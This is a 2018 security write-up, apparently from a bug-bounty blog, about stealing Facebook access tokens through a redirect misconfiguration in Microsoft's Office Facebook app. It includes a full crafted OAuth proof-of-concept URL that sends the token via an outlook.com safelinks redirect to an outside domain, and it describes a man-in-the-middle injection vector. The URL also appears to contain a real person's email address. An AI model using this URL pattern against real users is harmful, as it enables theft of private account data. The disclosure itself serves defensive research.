---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-04-13_hijacking-users-private-information-access_token-from-microsoft-office360-facebo.md
original_filename: 2018-04-13_hijacking-users-private-information-access_token-from-microsoft-office360-facebo.md
title: Hijacking User’s Private Information access_token from Microsoft Office360
  facebook App
category: documents
detected_topics:
- oauth
- command-injection
- mfa
- otp
- automation-abuse
- business-logic
tags:
- imported
- documents
- oauth
- command-injection
- mfa
- otp
- automation-abuse
- business-logic
language: en
raw_sha256: e628c5170d2046c8ae98aa388e75145fa1462e0e5f049fb7ff198813acf42a36
text_sha256: e65efd66aec5183195b0b60355c38bb4c830531f25237af12b63230ca9550bdc
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Hijacking User’s Private Information access_token from Microsoft Office360 facebook App

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-04-13_hijacking-users-private-information-access_token-from-microsoft-office360-facebo.md
- Source Type: markdown
- Detected Topics: oauth, command-injection, mfa, otp, automation-abuse, business-logic
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `e628c5170d2046c8ae98aa388e75145fa1462e0e5f049fb7ff198813acf42a36`
- Text SHA256: `e65efd66aec5183195b0b60355c38bb4c830531f25237af12b63230ca9550bdc`


## Content

---
title: "Hijacking User’s Private Information access_token from Microsoft Office360 facebook App"
page_title: "Hijacking User’s Private Information access_token from Microsoft Office360 facebook App – Seekurity"
url: "https://www.seekurity.com/blog/general/hijacking-users-private-information-access_token-from-microsoft-office360-facebook-app"
final_url: "https://seekurity.com/blog/2018/04/13/admin/general/hijacking-users-private-information-access_token-from-microsoft-office360-facebook-app"
authors: ["Mohamed A. Baset"]
programs: ["Microsoft"]
bugs: ["Logic flaw"]
publication_date: "2018-04-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5922
---

Hi Guys, Today i would like to show you how a single misconfiguration issue would jeopardize the user’s privacy if maliciously exploited hence hijack user “access_token” from Microsoft Office360 facebook App. Microsoft decided that this Office365 facebook app is NOT under their Microsoft Online Services bug bounty scope although we proved that our discovered bug can result in stealing Microsoft Office facebook App Access Token and that’s due to a misconfiguration in Microsoft Office Facebook App itself.

**Intro**

Remember Cambridge Analytica and the Facebook data leak? It was via one of the application that CA did to harvest the data of millions of American users. That being said, and with this discovered bug can be exploited on large scale user scope of misconfigured Microsoft Office 365 Facebook App to steal the access token of the users who gave access to it hence hijack their private information (data specified in the scope of the fb app itself)

**About Microsoft Office facebook App:**

Microsoft Office facebook App is used to exchange data with microsoft platforms (outlook, office, office 360, etc..) data like contacts, etc..

**The issue:**  
Microsoft office facebook app is configured to do a valid redirection to *.outlook.com that means not specified any protocols (http/https) and no subdomains (blah.outlook.com) which with a help of arp poisoning and injecting this piece of code in user’s traffic (any traffic) the attacker will be able to catch the access token among the traffic data, We added “response_type=token” to get the access_token instead of “user code” and because of the fact that a lot of facebook user’s have granted access to a trusted application like this one we *attackers* won’t be bothered by waiting the victim to grant access to the application again (already granted access time before the attack).

**The real life attack vectors:**  
1\. [Remotely] Via Invalidated Redirects

As stated in Microsoft Online Services bug bounty rules: “URL Redirects (unless combined with another vulnerability to produce a more severe vulnerability)”

We managed to get the following results as PoC examples:  
https://www.facebook.com/dialog/oauth?client_id=415932198472564&locale=en_US&scope=offline_access,user_about_me,friends_about_me,email,user_activities,friends_activities,user_birthday,friends_birthday,user_education_history,friends_education_history,user_hometown,friends_hometown,user_interests,friends_interests,user_website,friends_website,user_work_history,friends_work_history,user_status,friends_status,user_photo_video_tags,friends_photo_video_tags,user_photos,friends_photos,user_videos,friends_videos,friends_location,friends_interests&response_type=token&redirect_uri=https%3A%2F%2Fna01.safelinks.protection.outlook.com%2F%3Furl%3Dhttp%3A%2F%2Fwww.steinertglobal.com%2Fau%2Fen%2Fproducts%2Funisort%2F%26data%3D01%7C01%7Cpaul.kempton%40ausnetservices.com.au%7C105cfc6d14364b413e8508d3c0db0362%7Ca394e41ccf8d458eac1bddae1aa15629%7C0%26sdata%3DLyZ050NIANjY75OWFXyxvBhK1Q4yaWTLTv6XQWzVHoc%3D

Which will results in stealing user’s access token by redirecting it *in our example domain* to “http://www.steinertglobal.com”

PoC Video:

2\. [Locally] Via MiTM Attacks  
Because of the fact that our redirection endpoint could be to an “http” connection (like in the first attack vector) a local attacker can initial a man in the middle attack and inject a little piece of javascript code in the traffic to hijack the fragmented url and get the access token.

PoC Video:

Attackers will be able to gain access to this facebook app permissions after stealing the user’s “**access_token** “: (**offline_access, user_about_me, friends_about_me, email, user_activities, friends_activities, user_birthday, friends_birthday, user_education_history, friends_education_history, user_hometown, friends_hometown, user_interests, friends_interests, user_website, friends_website, user_work_history, friends_work_history, user_status, friends_status, user_photo_video_tags, friends_photo_video_tags, user_photos, friends_photos, user_videos, friends_videos, friends_location, friends_interests**)

Hope you enjoyed it.

**Your attention please!**  
Building a website? Or already built a one? Worried about your security? Think twice before going public and let us [protect your business](https://www.seekurity.com/#pricing)!

[](https://www.addtoany.com/add_to/facebook?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2018%2F04%2F13%2Fadmin%2Fgeneral%2Fhijacking-users-private-information-access_token-from-microsoft-office360-facebook-app&linkname=Hijacking%20User%E2%80%99s%20Private%20Information%20access_token%20from%20Microsoft%20Office360%20facebook%20App "Facebook")[](https://www.addtoany.com/add_to/pinterest?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2018%2F04%2F13%2Fadmin%2Fgeneral%2Fhijacking-users-private-information-access_token-from-microsoft-office360-facebook-app&linkname=Hijacking%20User%E2%80%99s%20Private%20Information%20access_token%20from%20Microsoft%20Office360%20facebook%20App "Pinterest")[](https://www.addtoany.com/add_to/twitter?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2018%2F04%2F13%2Fadmin%2Fgeneral%2Fhijacking-users-private-information-access_token-from-microsoft-office360-facebook-app&linkname=Hijacking%20User%E2%80%99s%20Private%20Information%20access_token%20from%20Microsoft%20Office360%20facebook%20App "Twitter")[](https://www.addtoany.com/add_to/whatsapp?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2018%2F04%2F13%2Fadmin%2Fgeneral%2Fhijacking-users-private-information-access_token-from-microsoft-office360-facebook-app&linkname=Hijacking%20User%E2%80%99s%20Private%20Information%20access_token%20from%20Microsoft%20Office360%20facebook%20App "WhatsApp")[](https://www.addtoany.com/add_to/telegram?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2018%2F04%2F13%2Fadmin%2Fgeneral%2Fhijacking-users-private-information-access_token-from-microsoft-office360-facebook-app&linkname=Hijacking%20User%E2%80%99s%20Private%20Information%20access_token%20from%20Microsoft%20Office360%20facebook%20App "Telegram")[](https://www.addtoany.com/add_to/linkedin?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2018%2F04%2F13%2Fadmin%2Fgeneral%2Fhijacking-users-private-information-access_token-from-microsoft-office360-facebook-app&linkname=Hijacking%20User%E2%80%99s%20Private%20Information%20access_token%20from%20Microsoft%20Office360%20facebook%20App "LinkedIn")[](https://www.addtoany.com/add_to/google_gmail?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2018%2F04%2F13%2Fadmin%2Fgeneral%2Fhijacking-users-private-information-access_token-from-microsoft-office360-facebook-app&linkname=Hijacking%20User%E2%80%99s%20Private%20Information%20access_token%20from%20Microsoft%20Office360%20facebook%20App "Gmail")[](https://www.addtoany.com/share)

access_token  App  Facebook  hijacking!  Information  Microsoft  Office360  private  Users
